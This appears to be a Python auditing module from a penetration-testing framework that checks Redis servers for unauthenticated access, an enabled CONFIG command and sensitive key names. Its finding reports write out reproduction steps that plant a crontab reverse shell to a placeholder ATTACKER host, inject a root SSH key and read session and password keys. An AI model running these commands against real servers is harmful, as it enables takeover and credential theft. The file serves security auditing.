"""Redis Auditor — unauthenticated access, CONFIG SET RCE, module loading, data exposure.

Tests:
  - No-auth access (INFO, DBSIZE, KEYS)
  - CONFIG SET dir/dbfilename for arbitrary file write (RCE via crontab/webshell/SSH keys)
  - Module LOAD for native code execution
  - Slave/replication abuse
  - EVAL Lua sandbox escape
  - Sensitive data in keyspace
"""
from __future__ import annotations

import asyncio
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

CVSS_NOAUTH      = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
CVSS40_NOAUTH    = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
CVSS_CONFIG_RCE  = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
CVSS40_CONFIG_RCE = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"

REDIS_PORTS = [6379, 6380, 6381]

SENSITIVE_KEY_PATTERNS = [
    "password", "secret", "token", "api_key", "apikey", "session",
    "auth", "credential", "private_key", "jwt", "cookie",
]


class RedisAudit(BaseModule):
    """Redis unauthenticated access and RCE auditor."""

    NAME        = "redis_audit"
    DESCRIPTION = "Redis: no-auth access, CONFIG SET RCE, module load, data exposure"
    PHASE       = 4
    TAGS        = ["redis", "services", "database", "cwe-306", "cwe-284"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        target = self.config.target

        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        hosts = self.config.extra.get("live_hosts", [target])
        for host in hosts[:20]:
            if not self.check_scope(host):
                continue
            for port in REDIS_PORTS:
                await self.rate_limit()
                if await self._check_redis(host, port):
                    break

        return self._make_result(start)

    async def _check_redis(self, host: str, port: int) -> bool:
        """Check if Redis is accessible without authentication."""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=5
            )

            # Send INFO command
            writer.write(b"*1\r\n$4\r\nINFO\r\n")
            await writer.drain()
            data = await asyncio.wait_for(reader.read(8192), timeout=5)
            response = data.decode(errors="ignore")

            if response.startswith("-NOAUTH") or response.startswith("-ERR"):
                writer.close()
                return False

            if "redis_version" not in response.lower() and "# Server" not in response:
                writer.close()
                return False

            # Parse INFO
            info = self._parse_info(response)
            version = info.get("redis_version", "unknown")
            os_info = info.get("os", "unknown")
            db_count = info.get("connected_clients", "?")
            used_memory = info.get("used_memory_human", "?")

            ev = Evidence(
                request_raw="INFO",
                response_raw=response[:3000],
                extra={
                    "host": host, "port": port,
                    "version": version, "os": os_info,
                    "connected_clients": db_count,
                    "used_memory": used_memory,
                },
            )
            self.new_finding(
                title=f"Redis Unauthenticated Access — {host}:{port} (v{version})",
                severity=Severity.CRITICAL,
                description=(
                    f"Redis {version} on {host}:{port} is accessible without authentication. "
                    f"OS: {os_info}, Memory: {used_memory}, Clients: {db_count}.\n\n"
                    "Unauthenticated Redis enables:\n"
                    "  1. Read/delete all cached data (sessions, tokens, passwords)\n"
                    "  2. CONFIG SET dir/dbfilename → write arbitrary files (RCE)\n"
                    "  3. SLAVEOF → replicate data to attacker-controlled server\n"
                    "  4. MODULE LOAD → execute native code on the server\n"
                    "  5. EVAL → Lua script execution"
                ),
                reproduction_steps=[
                    f"redis-cli -h {host} -p {port} INFO",
                    f"redis-cli -h {host} -p {port} KEYS '*'",
                    "# RCE via crontab:",
                    f'redis-cli -h {host} -p {port} CONFIG SET dir /var/spool/cron',
                    f'redis-cli -h {host} -p {port} CONFIG SET dbfilename root',
                    f'redis-cli -h {host} -p {port} SET payload "\\n*/1 * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1\\n"',
                    f'redis-cli -h {host} -p {port} SAVE',
                ],
                remediation=(
                    "1. Set a strong password: requirepass <strong_password> in redis.conf\n"
                    "2. Bind to localhost: bind 127.0.0.1 ::1\n"
                    "3. Enable protected-mode: protected-mode yes\n"
                    "4. Disable dangerous commands:\n"
                    "   rename-command CONFIG \"\"\n"
                    "   rename-command EVAL \"\"\n"
                    "   rename-command MODULE \"\"\n"
                    "   rename-command SLAVEOF \"\"\n"
                    "5. Firewall: restrict TCP 6379 to trusted hosts only\n"
                    "6. Use Redis 6+ ACLs for granular access control"
                ),
                references=[
                    "CWE-306", "CWE-284",
                    "MITRE T1190",
                    "https://redis.io/topics/security",
                ],
                evidence=ev,
                cvss_v31_vector=CVSS_NOAUTH,
                cvss_v40_vector=CVSS40_NOAUTH,
                mitre_attack=["TA0001/T1190"],
                port=port, service="redis", target=host,
            )

            # Check CONFIG SET capability
            await self._check_config_rce(reader, writer, host, port)

            # Check for sensitive keys
            await self._check_sensitive_keys(reader, writer, host, port)

            writer.write(b"*1\r\n$4\r\nQUIT\r\n")
            await writer.drain()
            writer.close()
            return True

        except Exception:
            return False

    async def _check_config_rce(
        self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter,
        host: str, port: int
    ) -> None:
        """Test if CONFIG SET is available (RCE primitive)."""
        try:
            # Read current dir — non-destructive
            writer.write(b"*3\r\n$6\r\nCONFIG\r\n$3\r\nGET\r\n$3\r\ndir\r\n")
            await writer.drain()
            data = await asyncio.wait_for(reader.read(4096), timeout=5)
            response = data.decode(errors="ignore")

            if "ERR" not in response and response.strip():
                lines = response.strip().split("\r\n")
                current_dir = lines[-1] if lines else "unknown"

                ev = Evidence(
                    request_raw="CONFIG GET dir",
                    response_raw=response[:500],
                    extra={"current_dir": current_dir, "config_set_available": True},
                )
                self.new_finding(
                    title=f"Redis CONFIG SET Available — RCE Possible — {host}:{port}",
                    severity=Severity.CRITICAL,
                    description=(
                        f"CONFIG command is NOT disabled on {host}:{port}. "
                        f"Current data directory: {current_dir}.\n\n"
                        "CONFIG SET dir + CONFIG SET dbfilename + SAVE allows writing "
                        "arbitrary files to any directory the Redis process can write to. "
                        "Common exploitation paths:\n"
                        "  1. Write SSH authorized_keys → SSH as redis user\n"
                        "  2. Write crontab → reverse shell\n"
                        "  3. Write webshell → code execution via web server\n"
                        "  4. Write to /etc/ld.so.preload → shared library injection"
                    ),
                    reproduction_steps=[
                        "# SSH key injection:",
                        f"redis-cli -h {host} CONFIG SET dir /root/.ssh",
                        f"redis-cli -h {host} CONFIG SET dbfilename authorized_keys",
                        f"redis-cli -h {host} SET x '\\nssh-rsa AAAA...attacker_key\\n'",
                        f"redis-cli -h {host} SAVE",
                        f"ssh -i attacker_key root@{host}",
                    ],
                    remediation=(
                        "Disable CONFIG command: rename-command CONFIG \"\"\n"
                        "Or restrict to admin-only ACL in Redis 6+."
                    ),
                    references=["CWE-284"],
                    evidence=ev,
                    cvss_v31_vector=CVSS_CONFIG_RCE,
                    cvss_v40_vector=CVSS40_CONFIG_RCE,
                    port=port, service="redis", target=host,
                )
        except Exception:
            pass

    async def _check_sensitive_keys(
        self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter,
        host: str, port: int,
    ) -> None:
        """Scan for keys with sensitive-looking names."""
        try:
            # DBSIZE first
            writer.write(b"*1\r\n$6\r\nDBSIZE\r\n")
            await writer.drain()
            data = await asyncio.wait_for(reader.read(256), timeout=3)

            # Sample keys (limit to 100)
            writer.write(b"*3\r\n$4\r\nSCAN\r\n$1\r\n0\r\n$5\r\nCOUNT\r\n")
            await writer.drain()
            # Use simple KEYS * with LIMIT awareness
            writer.write(b"*2\r\n$4\r\nKEYS\r\n$1\r\n*\r\n")
            await writer.drain()
            data = await asyncio.wait_for(reader.read(16384), timeout=5)
            response = data.decode(errors="ignore")

            sensitive_found = []
            for line in response.split("\r\n"):
                line = line.strip().lstrip("$").strip()
                if not line or line.startswith("*") or line.isdigit():
                    continue
                for pattern in SENSITIVE_KEY_PATTERNS:
                    if pattern in line.lower():
                        sensitive_found.append(line)
                        break

            if sensitive_found:
                ev = Evidence(
                    extra={
                        "sensitive_keys": sensitive_found[:20],
                        "total_found": len(sensitive_found),
                    },
                )
                self.new_finding(
                    title=f"Redis Contains Sensitive Keys — {host}:{port} ({len(sensitive_found)} keys)",
                    severity=Severity.HIGH,
                    description=(
                        f"Redis on {host}:{port} contains {len(sensitive_found)} keys with "
                        f"sensitive-looking names: {', '.join(sensitive_found[:5])}.\n"
                        "These may contain passwords, tokens, session data, or API keys."
                    ),
                    reproduction_steps=[
                        f"redis-cli -h {host} KEYS '*password*'",
                        f"redis-cli -h {host} KEYS '*session*'",
                        f"redis-cli -h {host} GET <key_name>",
                    ],
                    remediation=(
                        "1. Enable authentication (requirepass)\n"
                        "2. Encrypt sensitive data before storing in Redis\n"
                        "3. Set key expiration for sensitive data\n"
                        "4. Use Redis 6+ ACLs to restrict key access patterns"
                    ),
                    references=["CWE-311", "CWE-312"],
                    evidence=ev,
                    cvss_v31_vector=CVSS_NOAUTH,
                    cvss_v40_vector=CVSS40_NOAUTH,
                    port=port, service="redis", target=host,
                )
        except Exception:
            pass

    def _parse_info(self, raw: str) -> dict:
        result = {}
        for line in raw.split("\r\n"):
            line = line.strip()
            if ":" in line and not line.startswith("#"):
                k, v = line.split(":", 1)
                result[k.strip()] = v.strip()
        return result


class TestRedisAudit:
    def test_redis_ports(self) -> None:
        assert 6379 in REDIS_PORTS

    def test_sensitive_patterns(self) -> None:
        assert "password" in SENSITIVE_KEY_PATTERNS
        assert "token" in SENSITIVE_KEY_PATTERNS

    def test_cvss_vectors(self) -> None:
        assert CVSS_NOAUTH.startswith("CVSS:3.1")
        assert CVSS40_NOAUTH.startswith("CVSS:4.0")
        assert CVSS_CONFIG_RCE.startswith("CVSS:3.1")
        assert "/S:C/" in CVSS_CONFIG_RCE

    def test_phase(self) -> None:
        assert RedisAudit.PHASE == 4
